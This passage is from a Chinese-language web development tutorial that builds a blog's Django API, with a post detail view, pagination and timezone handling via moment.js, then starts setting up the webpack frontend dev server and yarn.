--header <span style="color: #8b2252;">'Content-Type: application/json'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Cookie: sessionid=wh0l46w101gre1z9ytoo6vjyvzfr4z6h'</span> <span style="color: #8b2252;">\</span>
--data <span style="color: #8b2252;">'{</span>
<span style="color: #8b2252;">    "title":"t200",</span>
<span style="color: #8b2252;">    "content":"nr200"</span>

<span style="color: #8b2252;">}'</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:6b1b783b-a065-4a4b-aecf-ccb37374424d" class="outline-3">
<h3 id="h:6b1b783b-a065-4a4b-aecf-ccb37374424d">文章接口实现</h3>
<div class="outline-text-3" id="text-h:6b1b783b-a065-4a4b-aecf-ccb37374424d">
<ul class="org-ul">
<li>根据post_id查询博文并返回。</li>
<li>如果博文只能作者看到，就需要认证，本次是公开，即所有人都能看到，所以不需要认证。</li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">post/views.py</span>
...
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">getpost</span>(request:HttpRequest, <span style="color: #483d8b;">id</span>:<span style="color: #483d8b;">int</span>):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">post</span> = Post.objects.get(pk=<span style="color: #483d8b;">id</span>)
        <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'post'</span>:{
            <span style="color: #8b2252;">'id'</span>:post.pk,
            <span style="color: #8b2252;">'title'</span>:post.title,
            <span style="color: #b22222;"># </span><span style="color: #b22222;">"2025-07-28T09:24:40.104Z"</span>
            <span style="color: #8b2252;">'postdate'</span>:post.postdate, <span style="color: #b22222;"># </span><span style="color: #b22222;">UTC&#23383;&#31526;&#20018;</span>
            <span style="color: #8b2252;">'author_id'</span>:post.author_id,
            <span style="color: #8b2252;">'author'</span>:post.author.username,
            <span style="color: #8b2252;">'content'</span>:post.content.content
        }})
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.NOT_FOUND)   
</pre>
</div>

<p>
登录之后发起请求
</p>
<div class="org-src-container">
<pre class="src src-sh">curl --location <span style="color: #8b2252;">'http://127.0.0.1:8000/posts/1'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Cookie: sessionid=wh0l46w101gre1z9ytoo6vjyvzfr4z6h'</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:b54173c0-2581-4982-8fd4-bfe2065ad9b0" class="outline-3">
<h3 id="h:b54173c0-2581-4982-8fd4-bfe2065ad9b0">时间问题</h3>
<div class="outline-text-3" id="text-h:b54173c0-2581-4982-8fd4-bfe2065ad9b0">
<p>
在Django中存入时间建议使用时区，否则会用警告，它存入的是UTC时间，可以简单认为这个时间是零时区(中时区)的GMT(格林威治时间)。
</p>

<p>
中国是UTC+8。由于在Django中设置了这个中国时区，所以，Django的内建模块使用时，使用了时区，所以时间是对的。
</p>

<p>
那么，时间数据送到浏览器端应该是什么呢?
</p>

<p>
从数据库拿出来送到浏览器端的还是0时区的时间，即使是时间戳。所以有2种方案送给前端:
</p>
<ol class="org-ol">
<li>时间戳</li>
<li>时间字符串</li>
</ol>

<p>
上面2种方案都是用了数据库字段的值，都是GMT，所以我们要转换时区。
</p>

<p>
JS的时间戳要乘以1000。它的时间戳不是秒，是毫秒。
</p>

<p>
还有就是使用现成的JS模块moment.js。
</p>

<ul class="org-ul">
<li>momentjs <a href="https://momentjs.cn/">https://momentjs.cn/</a></li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">npm install moment
npm install moment-timezone
</pre>
</div>

<p>
测试
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #a020f0;">const</span> <span style="color: #a0522d;">moment</span> = require(<span style="color: #8b2252;">'moment'</span>);
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">mtz</span> = require(<span style="color: #8b2252;">'moment-timezone'</span>);

ts = <span style="color: #8b2252;">"2025-07-28T09:24:40.104Z"</span>;
<span style="color: #a020f0;">var</span> <span style="color: #a0522d;">t1</span> = moment(ts);
console.log(t1);
console.log(t1.format(<span style="color: #8b2252;">'YYYYMMDD HH:mm:ss'</span>));

<span style="color: #a020f0;">var</span> <span style="color: #a0522d;">t2</span> = mtz(ts)
console.log(t2);
console.log(t2.tz(<span style="color: #8b2252;">'Asia/Shanghai'</span>).format(<span style="color: #8b2252;">'YYYYMMDD HH:mm:ss'</span>));

<span style="color: #b22222;">// </span><span style="color: #b22222;">&#36820;&#22238;&#32467;&#26524;</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">Moment&lt;2025-07-28T17:24:40+08:00&gt;</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">20250728 17:24:40</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">Moment&lt;2025-07-28T17:24:40+08:00&gt;</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">20250728 17:24:40</span>
</pre>
</div>

<p>
所以前端能很好的解决掉这个问题，我们放心输出时间字符串。
</p>
</div>
</div>
<div id="outline-container-h:5d768b55-fb83-4029-aca7-147e98ce35ef" class="outline-3">
<h3 id="h:5d768b55-fb83-4029-aca7-147e98ce35ef">列表页接口实现</h3>
<div class="outline-text-3" id="text-h:5d768b55-fb83-4029-aca7-147e98ce35ef">
<p>
request(GET ?page=5&amp;size=20) -&gt; view -&gt; response(json [posts]})
</p>

<p>
发起GET请求，通过查询字符串<a href="http://url/posts/?page2">http://url/posts/?page2</a> 查询第二页数据，找到视图函数处理，返回Json数组。
</p>


<div class="org-src-container">
<pre class="src src-txt">GET /posts/?page=3&amp;size=20 文章列表，视图类PostView

响应
200 成功返回文章列表
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">post/views.py</span>
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, JsonResponse, HttpRequest
<span style="color: #a020f0;">from</span> django.views <span style="color: #a020f0;">import</span> View
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> .models <span style="color: #a020f0;">import</span> Post, Content
<span style="color: #a020f0;">import</span> datetime
<span style="color: #a020f0;">from</span> django.db.transaction <span style="color: #a020f0;">import</span> atomic
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">PostView</span>(View):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26041;&#27861;&#21517;&#19968;&#23450;&#35201;&#23567;&#20889; &#25991;&#31456;&#21015;&#34920; /posts/?page=3&amp;size=20</span>
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a0522d;">posts</span> = Post.objects.order_by(<span style="color: #8b2252;">'-pk'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20840;&#34920;&#25195;&#25551;&#65292;&#35201;&#35299;&#20915;&#20998;&#39029;&#38382;&#39064;</span>

            <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'posts'</span>:[
                {<span style="color: #8b2252;">'id'</span>:post.<span style="color: #483d8b;">id</span>, <span style="color: #8b2252;">'title'</span>:post.title}
                <span style="color: #a020f0;">for</span> post <span style="color: #a020f0;">in</span> posts
            ]})
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            <span style="color: #483d8b;">print</span>(e)
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST)
...
</pre>
</div>
</div>
<div id="outline-container-h:99443d26-9e90-450d-877f-c17d1a132d49" class="outline-4">
<h4 id="h:99443d26-9e90-450d-877f-c17d1a132d49">完善分页</h4>
<div class="outline-text-4" id="text-h:99443d26-9e90-450d-877f-c17d1a132d49">
<p>
分页信息，一般有：当前页/总页数、每页条数，记录总数。
</p>
<ul class="org-ul">
<li>当前页：page</li>
<li>每页条数：size ,每页最多多少行</li>
<li>总页数：pages = math.ceil(count/size)</li>
<li>记录总数：total,从select * from table来</li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">post/views.py</span>
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, JsonResponse, HttpRequest
<span style="color: #a020f0;">from</span> django.views <span style="color: #a020f0;">import</span> View
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> .models <span style="color: #a020f0;">import</span> Post, Content
<span style="color: #a020f0;">import</span> datetime
<span style="color: #a020f0;">from</span> django.db.transaction <span style="color: #a020f0;">import</span> atomic
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">PostView</span>(View):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26041;&#27861;&#21517;&#19968;&#23450;&#35201;&#23567;&#20889; &#25991;&#31456;&#21015;&#34920; /posts/?page=3&amp;size=20</span>
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a020f0;">try</span>: <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26377;&#20219;&#20309;&#24322;&#24120;page&#32473;&#40664;&#35748;&#20540;</span>
                <span style="color: #a0522d;">page</span> = <span style="color: #483d8b;">int</span>(request.GET.get(<span style="color: #8b2252;">'page'</span>, 1)) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#32570;&#30465;&#20540;1</span>
                <span style="color: #b22222;">#</span><span style="color: #b22222;">/posts/?page=300000000&amp;size=20000000 &#35299;&#20915;&#26159;&#21542;&#36229;&#30028;&#38382;&#39064;</span>
                <span style="color: #a0522d;">page</span> = page <span style="color: #a020f0;">if</span> page &gt; 0 <span style="color: #a020f0;">and</span> page &lt;51 <span style="color: #a020f0;">else</span> 1
            <span style="color: #a020f0;">except</span>:
                <span style="color: #a0522d;">page</span> = 1
            <span style="color: #a020f0;">try</span>:
                <span style="color: #a0522d;">size</span> = <span style="color: #483d8b;">int</span>(request.GET.get(<span style="color: #8b2252;">'size'</span>, 20))
                <span style="color: #a0522d;">size</span> = size <span style="color: #a020f0;">if</span> size &gt; 0 <span style="color: #a020f0;">and</span> size &lt; 101 <span style="color: #a020f0;">else</span> 20
            <span style="color: #a020f0;">except</span>:
                <span style="color: #a0522d;">size</span> = 20
            <span style="color: #483d8b;">print</span>(page, size)

            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20999;&#29255;</span>
            <span style="color: #a0522d;">start</span> = size*(page-1) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#31532;1&#22825; size*(1-1)</span>
            <span style="color: #a0522d;">posts</span> = Post.objects.order_by(<span style="color: #8b2252;">'-pk'</span>)[start:start+size] <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20840;&#34920;&#25195;&#25551;&#65292;&#35201;&#35299;&#20915;&#20998;&#39029;&#38382;&#39064;</span>

            <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'posts'</span>:[
                {<span style="color: #8b2252;">'id'</span>:post.<span style="color: #483d8b;">id</span>, <span style="color: #8b2252;">'title'</span>:post.title}
                <span style="color: #a020f0;">for</span> post <span style="color: #a020f0;">in</span> posts
            ]})
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            <span style="color: #483d8b;">print</span>(e)
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST)
</pre>
</div>

<p>
也可以使用Django提供的Paginator类来完成。
</p>

<p>
Paginator文档<a href="https://docs.djangoproject.com/en/5.2/topics/pagination/">https://docs.djangoproject.com/en/5.2/topics/pagination/</a>
</p>

<p>
但是，还是自己更加简单明了些。
</p>
</div>
</div>
<div id="outline-container-h:1838ff94-d958-4944-8bd8-46da421bcf42" class="outline-4">
<h4 id="h:1838ff94-d958-4944-8bd8-46da421bcf42">改写校验函数</h4>
<div class="outline-text-4" id="text-h:1838ff94-d958-4944-8bd8-46da421bcf42">
<p>
修改post/views.py文件
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, JsonResponse, HttpRequest
<span style="color: #a020f0;">from</span> django.views <span style="color: #a020f0;">import</span> View
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> .models <span style="color: #a020f0;">import</span> Post, Content
<span style="color: #a020f0;">import</span> datetime
<span style="color: #a020f0;">from</span> django.db.transaction <span style="color: #a020f0;">import</span> atomic
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages
<span style="color: #a020f0;">import</span> math

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">validate</span>(d:<span style="color: #483d8b;">dict</span>,name:<span style="color: #483d8b;">str</span>,default,type_func,validate_func):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">ret</span> = type_func(d.get(name,default))
        <span style="color: #a0522d;">ret</span> = validate_func(ret,default)
    <span style="color: #a020f0;">except</span>:
        <span style="color: #a0522d;">ret</span> = default
    <span style="color: #a020f0;">return</span> ret

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">PostView</span>(View):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26041;&#27861;&#21517;&#19968;&#23450;&#35201;&#23567;&#20889; &#25991;&#31456;&#21015;&#34920; /posts/?page=3&amp;size=20</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#39029;&#30721;  </span>
        <span style="color: #a0522d;">page</span> = validate(request.GET,<span style="color: #8b2252;">"page"</span>, 1, <span style="color: #483d8b;">int</span>, <span style="color: #a020f0;">lambda</span> x,y:x <span style="color: #a020f0;">if</span> x&gt;0 <span style="color: #a020f0;">and</span> x &lt;51 <span style="color: #a020f0;">else</span> y)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#27599;&#39029;&#26465;&#25968;</span>
        <span style="color: #b22222;">#</span><span style="color: #b22222;">&#27880;&#24847;&#65292;&#36825;&#20010;&#25968;&#25454;&#19981;&#35201;&#36731;&#26131;&#35753;&#27983;&#35272;&#22120;&#31471;&#25913;&#21464;&#65292;&#22914;&#26524;&#20801;&#35768;&#25913;&#21464;&#65292;&#19968;&#23450;&#35201;&#25511;&#21046;&#33539;&#22260;</span>
        <span style="color: #a0522d;">size</span> = validate(request.GET,<span style="color: #8b2252;">"size"</span>, 20, <span style="color: #483d8b;">int</span>, <span style="color: #a020f0;">lambda</span> x,y:x <span style="color: #a020f0;">if</span> x&gt;0 <span style="color: #a020f0;">and</span> x&lt;101 <span style="color: #a020f0;">else</span> y)
        <span style="color: #483d8b;">print</span>(page, size)

        <span style="color: #a020f0;">try</span>:
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20998;&#39029;</span>
            <span style="color: #a0522d;">start</span> = size*(page-1) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#31532;1&#22825; size*(1-1)</span>
            <span style="color: #a0522d;">mgr</span> = Post.objects
            <span style="color: #a0522d;">total</span> = mgr.count()
            <span style="color: #a0522d;">posts</span> = mgr.order_by(<span style="color: #8b2252;">'-pk'</span>)[start:start+size]

            <span style="color: #a020f0;">return</span> JsonResponse({
                <span style="color: #8b2252;">'posts'</span>:[{<span style="color: #8b2252;">'id'</span>:post.<span style="color: #483d8b;">id</span>, <span style="color: #8b2252;">'title'</span>:post.title} <span style="color: #a020f0;">for</span> post <span style="color: #a020f0;">in</span> posts],
                <span style="color: #8b2252;">'pagination'</span>:{
                    <span style="color: #8b2252;">'page'</span>:page,
                    <span style="color: #8b2252;">'size'</span>:size,
                    <span style="color: #8b2252;">'total'</span>:total, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24635;&#20849;&#26377;&#22810;&#23569;&#20010;</span>
                    <span style="color: #8b2252;">'pages'</span>:math.ceil(total / size) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24635;&#20849;&#26377;&#22810;&#23569;&#39029; &#21521;&#19978;&#21462;&#25972;</span>
                }
            })
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            <span style="color: #483d8b;">print</span>(e)
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST)
</pre>
</div>

<p>
测试
</p>
<div class="org-src-container">
<pre class="src src-sh">curl --location <span style="color: #8b2252;">'http://127.0.0.1:8000/posts/?page=3&amp;size=1'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Cookie: sessionid=wh0l46w101gre1z9ytoo6vjyvzfr4z6h'</span>
</pre>
</div>

<p>
完整post/views.py文件
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, JsonResponse, HttpRequest
<span style="color: #a020f0;">from</span> django.views <span style="color: #a020f0;">import</span> View
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> .models <span style="color: #a020f0;">import</span> Post, Content
<span style="color: #a020f0;">import</span> datetime
<span style="color: #a020f0;">from</span> django.db.transaction <span style="color: #a020f0;">import</span> atomic
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages
<span style="color: #a020f0;">import</span> math

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">validate</span>(d:<span style="color: #483d8b;">dict</span>,name:<span style="color: #483d8b;">str</span>,default,type_func,validate_func):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">ret</span> = type_func(d.get(name,default))
        <span style="color: #a0522d;">ret</span> = validate_func(ret,default)
    <span style="color: #a020f0;">except</span>:
        <span style="color: #a0522d;">ret</span> = default
    <span style="color: #a020f0;">return</span> ret

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">PostView</span>(View):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26041;&#27861;&#21517;&#19968;&#23450;&#35201;&#23567;&#20889; &#25991;&#31456;&#21015;&#34920; /posts/?page=3&amp;size=20</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#39029;&#30721;  </span>
        <span style="color: #a0522d;">page</span> = validate(request.GET,<span style="color: #8b2252;">"page"</span>, 1, <span style="color: #483d8b;">int</span>, <span style="color: #a020f0;">lambda</span> x,y:x <span style="color: #a020f0;">if</span> x&gt;0 <span style="color: #a020f0;">and</span> x &lt;51 <span style="color: #a020f0;">else</span> y)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#27599;&#39029;&#26465;&#25968;</span>
        <span style="color: #b22222;">#</span><span style="color: #b22222;">&#27880;&#24847;&#65292;&#36825;&#20010;&#25968;&#25454;&#19981;&#35201;&#36731;&#26131;&#35753;&#27983;&#35272;&#22120;&#31471;&#25913;&#21464;&#65292;&#22914;&#26524;&#20801;&#35768;&#25913;&#21464;&#65292;&#19968;&#23450;&#35201;&#25511;&#21046;&#33539;&#22260;</span>
        <span style="color: #a0522d;">size</span> = validate(request.GET,<span style="color: #8b2252;">"size"</span>, 20, <span style="color: #483d8b;">int</span>, <span style="color: #a020f0;">lambda</span> x,y:x <span style="color: #a020f0;">if</span> x&gt;0 <span style="color: #a020f0;">and</span> x&lt;101 <span style="color: #a020f0;">else</span> y)
        <span style="color: #483d8b;">print</span>(page, size)

        <span style="color: #a020f0;">try</span>:
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20998;&#39029;</span>
            <span style="color: #a0522d;">start</span> = size*(page-1) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#31532;1&#22825; size*(1-1)</span>
            <span style="color: #a0522d;">mgr</span> = Post.objects
            <span style="color: #a0522d;">total</span> = mgr.count()
            <span style="color: #a0522d;">posts</span> = mgr.order_by(<span style="color: #8b2252;">'-pk'</span>)[start:start+size]

            <span style="color: #a020f0;">return</span> JsonResponse({
                <span style="color: #8b2252;">'posts'</span>:[{<span style="color: #8b2252;">'id'</span>:post.<span style="color: #483d8b;">id</span>, <span style="color: #8b2252;">'title'</span>:post.title} <span style="color: #a020f0;">for</span> post <span style="color: #a020f0;">in</span> posts],
                <span style="color: #8b2252;">'pagination'</span>:{
                    <span style="color: #8b2252;">'page'</span>:page,
                    <span style="color: #8b2252;">'size'</span>:size,
                    <span style="color: #8b2252;">'total'</span>:total, <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24635;&#20849;&#26377;&#22810;&#23569;&#20010;</span>
                    <span style="color: #8b2252;">'pages'</span>:math.ceil(total / size) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24635;&#20849;&#26377;&#22810;&#23569;&#39029; &#21521;&#19978;&#21462;&#25972;</span>
                }
            })
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            <span style="color: #483d8b;">print</span>(e)
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST)

    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24517;&#39035;&#30331;&#24405;</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">post</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#27809;&#26377;post&#20989;&#25968;&#65292;POST&#35831;&#27714;&#26080;&#27861;&#23545;&#24212;&#65292;&#36820;&#22238;405</span>
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
            <span style="color: #a0522d;">title</span> = payload[<span style="color: #8b2252;">'title'</span>]
            <span style="color: #a0522d;">C</span> = payload[<span style="color: #8b2252;">'content'</span>]
            <span style="color: #a0522d;">post</span> = Post(title=title)
            <span style="color: #a0522d;">content</span> = Content()

            post.<span style="color: #a0522d;">postdate</span> = datetime.datetime.now(
                datetime.timezone(datetime.timedelta(hours=8))
            )
            <span style="color: #b22222;"># </span><span style="color: #b22222;">post.author_id = 2 #request.user.id</span>
            post.<span style="color: #a0522d;">author</span> = request.user
            content.<span style="color: #a0522d;">content</span> = C

            <span style="color: #a020f0;">with</span> atomic():
                post.save()
                content.<span style="color: #a0522d;">post</span>  = post
                content.save()


            <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'post'</span>:{
                <span style="color: #8b2252;">'id'</span>:post.<span style="color: #483d8b;">id</span>
            }})
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">getpost</span>(request:HttpRequest, <span style="color: #483d8b;">id</span>:<span style="color: #483d8b;">int</span>):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">post</span> = Post.objects.get(pk=<span style="color: #483d8b;">id</span>)
        <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'post'</span>:{
            <span style="color: #8b2252;">'id'</span>:post.pk,
            <span style="color: #8b2252;">'title'</span>:post.title,
            <span style="color: #b22222;"># </span><span style="color: #b22222;">"2025-07-28T09:24:40.104Z"</span>
            <span style="color: #8b2252;">'postdate'</span>:post.postdate, <span style="color: #b22222;"># </span><span style="color: #b22222;">UTC&#23383;&#31526;&#20018;</span>
            <span style="color: #8b2252;">'author_id'</span>:post.author_id,
            <span style="color: #8b2252;">'author'</span>:post.author.username,
            <span style="color: #8b2252;">'content'</span>:post.content.content
        }})
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.NOT_FOUND)   
</pre>
</div>
</div>
</div>
</div>
</section>
<section id="outline-container-h:ab043578-1b85-4bdb-b412-17d7a08c7061" class="outline-2">
<h2 id="h:ab043578-1b85-4bdb-b412-17d7a08c7061">前端开发-登录功能实现</h2>
<div class="outline-text-2" id="text-h:ab043578-1b85-4bdb-b412-17d7a08c7061">
</div>
<div id="outline-container-h:2a1f7cef-fbfc-4cc8-9bd0-572a1139956a" class="outline-3">
<h3 id="h:2a1f7cef-fbfc-4cc8-9bd0-572a1139956a">开发环境设置</h3>
<div class="outline-text-3" id="text-h:2a1f7cef-fbfc-4cc8-9bd0-572a1139956a">
<p>
使用脚手架，解压。在src中新增component、service、css目录。
</p>

<p>
注意：没有特别说明，js开发都在src目录下
</p>

<p>
目录结构
</p>

<div class="org-src-container">
<pre class="src src-sh">frontend/
    &#9474;-.babelrc
    &#9474;-.gitignore <span style="color: #b22222;">#</span><span style="color: #b22222;">git&#30340;&#24573;&#30053;&#25991;&#20214;</span>
    &#9474;-.npmrc    <span style="color: #b22222;">#</span><span style="color: #b22222;">npm&#30340;&#26381;&#21153;&#22120;&#37197;&#32622;&#65292;&#26412;&#27425;&#20351;&#29992;&#30340;&#26159;&#38463;&#37324;</span>
    &#9474;-index.html <span style="color: #b22222;">#</span><span style="color: #b22222;">dev server&#20351;&#29992;&#30340;&#39318;&#39029;</span>
    &#9474;-jsconfig.json
    &#9474;-LICENSE
    &#9474;-package-lock.json
    &#9474;-package.json  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#39033;&#30446;&#30340;&#26681;&#30446;&#24405;&#23433;&#35013;&#25991;&#20214;&#65292;&#20351;&#29992;npm install&#21487;&#20197;&#26500;&#24314;&#39033;&#30446;</span>
    &#9474;-README.md
    &#9474;-webpack.config.dev.js <span style="color: #b22222;">#</span><span style="color: #b22222;">&#24320;&#21457;&#29992;&#30340;&#37197;&#32622;&#25991;&#20214;</span>
    &#9474;-webpack.config.prod.js <span style="color: #b22222;">#</span><span style="color: #b22222;">&#29983;&#20135;&#29615;&#22659;&#65292;&#25171;&#21253;&#29992;&#30340;&#37197;&#32622;&#25991;&#20214;</span>
    &#9492;&#9472;src/
        &#9474;- component/ <span style="color: #b22222;">#</span><span style="color: #b22222;">&#33258;&#24049;&#32452;&#20214;&#25991;&#20214;&#22841;</span>
        &#9474;- service/  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26381;&#21153;&#31243;&#24207;</span>
        &#9474;- css/  <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26679;&#24335;&#34920;</span>
        &#9474;- index.html <span style="color: #b22222;">#</span><span style="color: #b22222;">&#27169;&#26495;&#39029;&#38754;</span>
        &#9474;- index.js
</pre>
</div>

<p>
1.修改项目信息 package.json 文件
</p>

<div class="org-src-container">
<pre class="src src-js">{
    <span style="color: #8b2252;">"name"</span>:<span style="color: #8b2252;">"blog"</span>,
    <span style="color: #8b2252;">"description"</span>:<span style="color: #8b2252;">"blog project"</span>,
    <span style="color: #8b2252;">"author"</span>:<span style="color: #8b2252;">"abc"</span>
}
</pre>
</div>


<p>
2.修改webpack.config.dev.js
</p>

<div class="org-src-container">
<pre class="src src-js">devServer: {
        compress: <span style="color: #008b8b;">true</span>, <span style="color: #b22222;">/* </span><span style="color: #b22222;">gzip</span><span style="color: #b22222;"> */</span>
        <span style="color: #b22222;">//</span><span style="color: #b22222;">host:'192.168.61.109', /* &#35774;&#32622;ip */</span>
        port: 3000,
        publicPath: <span style="color: #8b2252;">'/assets/'</span>, <span style="color: #b22222;">/* </span><span style="color: #b22222;">&#35774;&#32622;bundled files&#27983;&#35272;&#22120;&#31471;&#35775;&#38382;&#22320;&#22336;</span><span style="color: #b22222;"> */</span>
        hot: <span style="color: #008b8b;">true</span>,  <span style="color: #b22222;">/* </span><span style="color: #b22222;">&#24320;&#21551;HMR&#28909;&#27169;&#22359;&#26367;&#25442;</span><span style="color: #b22222;"> */</span>
        inline: <span style="color: #008b8b;">true</span>, <span style="color: #b22222;">/* </span><span style="color: #b22222;">&#25511;&#21046;&#27983;&#35272;&#22120;&#25511;&#21046;&#21488;&#26159;&#21542;&#26174;&#31034;&#20449;&#24687;</span><span style="color: #b22222;"> */</span>
        historyApiFallback: <span style="color: #008b8b;">true</span>,
        stats: {
            chunks: <span style="color: #008b8b;">false</span>
        },
        proxy: { <span style="color: #b22222;">//</span><span style="color: #b22222;">&#20195;&#29702;</span>
            <span style="color: #8b2252;">'/api'</span>: {
                target: <span style="color: #8b2252;">'http://127.0.0.1:8000'</span>,
                pathRewrite: {<span style="color: #8b2252;">"^/api"</span> : <span style="color: #8b2252;">""</span>},
                changeOrigin: <span style="color: #008b8b;">true</span>
            }
        }
    }
</pre>
</div>

<p>
3.安装依赖 <code>npm install</code>
</p>

<ul class="org-ul">
<li>npm会按照package.json中依赖的包。也可以使用新的包管理工具yarn安装模块</li>
<li>使用yarn替换npm安装，速度会更快写，yarn是并行安装，npm是串行安装。</li>
</ul>

<p>
<a href="https://yarn.bootcss.com/docs/install/">https://yarn.bootcss.com/docs/install/</a> <a href="https://www.npmjs.com/search?q=yarn">https://www.npmjs.com/search?q=yarn</a>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">yarn&#23433;&#35013;</span>
npm install -g yarn

yarn <span style="color: #b22222;">#</span><span style="color: #b22222;">&#30456;&#24403;&#20110;npm install</span>

